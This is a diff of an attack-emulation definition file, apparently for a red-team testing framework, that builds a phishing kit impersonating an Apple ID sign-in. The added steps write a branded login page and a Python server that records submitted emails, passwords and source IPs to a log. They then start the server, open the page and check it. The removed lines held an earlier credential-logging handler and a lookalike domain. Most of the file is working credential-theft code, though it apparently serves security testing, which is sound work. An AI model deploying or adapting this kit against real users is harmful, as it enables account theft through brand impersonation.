@@ -5,9 +5,10 @@ name: Fake Login Page Creation
 authors:
   - mbhatt
 description: |
-  Demonstrates fake login page creation by generating a convincing replica of
-  legitimate authentication portals. Includes branding elements, SSL indicators,
-  and credential capture mechanisms.
+  Creates a branded fake login page impersonating a target company, serves it
+  via a Python HTTP server, opens the page in the default browser, and verifies
+  the server is responding. The login page includes realistic styling and form
+  elements to capture credentials.
 
 mitre:
   tactics:
@@ -26,92 +27,150 @@ args:
     description: "Company being impersonated"
     type: string
     default: "Apple"
-  - name: fake_domain
-    description: "Attacker-controlled domain"
-    type: string
-    default: "secure-apple-id-verify.com"
-  - name: logo_url
-    description: "URL to company logo"
-    type: string
-    default: "https://www.apple.com/ac/structured-data/images/open_graph_logo.160.png"
+  - name: listen_port
+    description: "Port for the fake login page HTTP server"
+    type: int
+    default: 8081
 
 steps:
-  - name: create_fake_login_page_html
-    description: Create fake login page HTML with branding
+  - name: create_branded_login_page
+    description: Create a branded login HTML page impersonating the target company
     inline: |
-      mkdir -p /tmp/fake_login_pages
-      cat > /tmp/fake_login_pages/apple_id.html << 'HTMLEOF'
+      mkdir -p /tmp/ttp_fakelogin
+      cat > /tmp/ttp_fakelogin/index.html << HTMLEOF
       <!DOCTYPE html>
       <html lang="en">
       <head>
         <meta charset="UTF-8">
-        <title>{{ target_company }} ID Sign In</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>{{ .Args.target_company }} ID - Sign In</title>
+        <style>
+          * { margin: 0; padding: 0; box-sizing: border-box; }
+          body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background-color: #f5f5f7; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+          .container { background: white; padding: 48px; border-radius: 16px; box-shadow: 0 4px 24px rgba(0,0,0,0.08); width: 400px; text-align: center; }
+          .logo { font-size: 48px; margin-bottom: 8px; }
+          h1 { font-size: 24px; font-weight: 600; color: #1d1d1f; margin-bottom: 4px; }
+          .subtitle { color: #86868b; font-size: 14px; margin-bottom: 32px; }
+          .form-group { margin-bottom: 16px; text-align: left; }
+          label { display: block; font-size: 13px; color: #6e6e73; margin-bottom: 4px; }
+          input[type="email"], input[type="password"] { width: 100%; padding: 12px 16px; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 16px; outline: none; }
+          input:focus { border-color: #0071e3; box-shadow: 0 0 0 3px rgba(0,113,227,0.2); }
+          .btn { width: 100%; padding: 12px; background: #0071e3; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; margin-top: 16px; }
+          .btn:hover { background: #0077ED; }
+          .footer { margin-top: 24px; font-size: 12px; color: #86868b; }
+          .footer a { color: #0071e3; text-decoration: none; }
+        </style>
       </head>
       <body>
         <div class="container">
-          <div class="logo"><img src="{{ logo_url }}" alt="{{ target_company }}"></div>
-          <h1>Sign In to Your Account</h1>
-          <form id="loginForm" action="/auth/verify" method="POST">
-            <label for="email">Apple ID</label>
-            <input type="email" id="email" name="email" placeholder="you@example.com" required>
-            <label for="password">Password</label>
-            <input type="password" id="password" name="password" placeholder="Password" required>
-            <button type="submit">Sign In</button>
+          <div class="logo">&#63743;</div>
+          <h1>{{ .Args.target_company }} ID</h1>
+          <p class="subtitle">Sign in to continue</p>
+          <form method="POST" action="/auth">
+            <div class="form-group">
+              <label for="email">{{ .Args.target_company }} ID</label>
+              <input type="email" id="email" name="email" placeholder="you@example.com" required>
+            </div>
+            <div class="form-group">
+              <label for="password">Password</label>
+              <input type="password" id="password" name="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="btn">Sign In</button>
           </form>
+          <div class="footer">
+            <a href="#">Forgot {{ .Args.target_company }} ID or password?</a><br><br>
+            <span>Don't have an {{ .Args.target_company }} ID? <a href="#">Create one now.</a></span>
+          </div>
         </div>
       </body>
       </html>
       HTMLEOF
-      echo "Created fake login page"
+      echo "[+] Created branded login page for {{ .Args.target_company }}"
+
+  - name: create_login_server
+    description: Create Python HTTP server to serve the fake login page
+    inline: |
+      cat > /tmp/ttp_fakelogin/server.py << 'PYEOF'
+      #!/usr/bin/env python3
+      import http.server
+      import urllib.parse
+      import sys
+      import json
+      from datetime import datetime
+
+      PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8081
+
+      class LoginHandler(http.server.SimpleHTTPRequestHandler):
+          def do_GET(self):
+              self.send_response(200)
+              self.send_header("Content-type", "text/html")
+              self.end_headers()
+              with open("/tmp/ttp_fakelogin/index.html", "rb") as f:
+                  self.wfile.write(f.read())
+
+          def do_POST(self):
+              content_length = int(self.headers.get("Content-Length", 0))
+              post_data = self.rfile.read(content_length).decode("utf-8")
+              parsed = urllib.parse.parse_qs(post_data)
+              entry = {
+                  "timestamp": datetime.now().isoformat(),
+                  "email": parsed.get("email", [""])[0],
+                  "password": parsed.get("password", [""])[0],
+                  "source_ip": self.client_address[0],
+              }
+              with open("/tmp/ttp_fakelogin/captured.log", "a") as f:
+                  f.write(json.dumps(entry) + "\n")
+              print(f"[CAPTURED] {entry['email']}:{entry['password']}")
+              self.send_response(200)
+              self.send_header("Content-type", "text/html")
+              self.end_headers()
+              self.wfile.write(b"<html><body><p>Verifying your credentials...</p></body></html>")
+
+      if __name__ == "__main__":
+          server = http.server.HTTPServer(("127.0.0.1", PORT), LoginHandler)
+          print(f"[+] Fake login server running on http://127.0.0.1:{PORT}")
+          server.serve_forever()
+      PYEOF
+      chmod +x /tmp/ttp_fakelogin/server.py
+      echo "[+] Created fake login server script"
+
+  - name: start_login_server
+    description: Start the fake login HTTP server in the background
+    inline: |
+      python3 /tmp/ttp_fakelogin/server.py {{ .Args.listen_port }} &
+      SERVER_PID=$!
+      echo "${SERVER_PID}" > /tmp/ttp_fakelogin/server.pid
+      sleep 2
+      if kill -0 ${SERVER_PID} 2>/dev/null; then
+        echo "[+] Fake login server started with PID ${SERVER_PID} on port {{ .Args.listen_port }}"
+      else
+        echo "[-] Failed to start fake login server"
+        exit 1
+      fi
+
+  - name: open_login_page_in_browser
+    description: Open the fake login page in the default browser
+    inline: |
+      open http://127.0.0.1:{{ .Args.listen_port }}
+      echo "[+] Opened fake login page in default browser at http://127.0.0.1:{{ .Args.listen_port }}"
+
+  - name: verify_server_responding
+    description: Verify the fake login server is responding with curl
+    inline: |
+      HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:{{ .Args.listen_port }}/)
+      echo "[+] Server HTTP response code: ${HTTP_CODE}"
+      CONTENT=$(curl -s http://127.0.0.1:{{ .Args.listen_port }}/ | head -5)
+      echo "[+] Page content preview:"
+      echo "${CONTENT}"
+      test "${HTTP_CODE}" = "200" && echo "[+] PASS: Fake login server is operational"
     cleanup:
       inline: |
-        rm -rf /tmp/fake_login_pages
-
-  - name: create_backend_credential_handler
-    description: Create backend credential handler
-    inline: |
-      cat > /tmp/fake_login_pages/auth_handler.js << 'JSEOF'
-      const express = require('express');
-      const app = express();
-      app.use(express.urlencoded({ extended: true }));
-      app.post('/auth/verify', (req, res) => {
-        const { email, password } = req.body;
-        console.log('Credentials captured:', { email, password });
-        res.send('Verifying your credentials...');
-      });
-      app.listen(8080, () => console.log('Server running on port 8080'));
-      JSEOF
-      echo "Created authentication handler"
-
-  - name: log_page_creation
-    description: Log page creation details
-    inline: |
-      mkdir -p /tmp/login_page_logs
-      timestamp=$(date +%Y%m%d_%H%M%S)
-      cat > /tmp/login_page_logs/creation_${timestamp}.log << 'LOGEOF'
-      Fake Login Page Created
-      Target Company: {{ target_company }}
-      Fake Domain: {{ fake_domain }}
-      Page Type: Authentication Portal
-      LOGEOF
-    cleanup:
-      inline: |
-        rm -rf /tmp/login_page_logs
-
-  - name: verify_login_page_html_created
-    description: Verify login page HTML was created
-    inline: |
-      test -f /tmp/fake_login_pages/apple_id.html && echo "PASS: Login page HTML created"
-
-  - name: verify_page_contains_form
-    description: Verify page contains a form element
-    inline: |
-      grep -q "<form" /tmp/fake_login_pages/apple_id.html && echo "PASS: Login form present"
-
-  - name: verify_branding_elements_present
-    description: Verify branding elements are present
-    inline: |
-      grep -q "{{ target_company }}" /tmp/fake_login_pages/apple_id.html && echo "PASS: Company branding present"
+        if [ -f /tmp/ttp_fakelogin/server.pid ]; then
+          kill $(cat /tmp/ttp_fakelogin/server.pid) 2>/dev/null || true
+        fi
+        pkill -f "python3 /tmp/ttp_fakelogin/server.py" 2>/dev/null || true
+        rm -rf /tmp/ttp_fakelogin
+        echo "[+] Cleanup: Server stopped and temp files removed"
 
 tests:
   - name: fake_login_page_creation_test
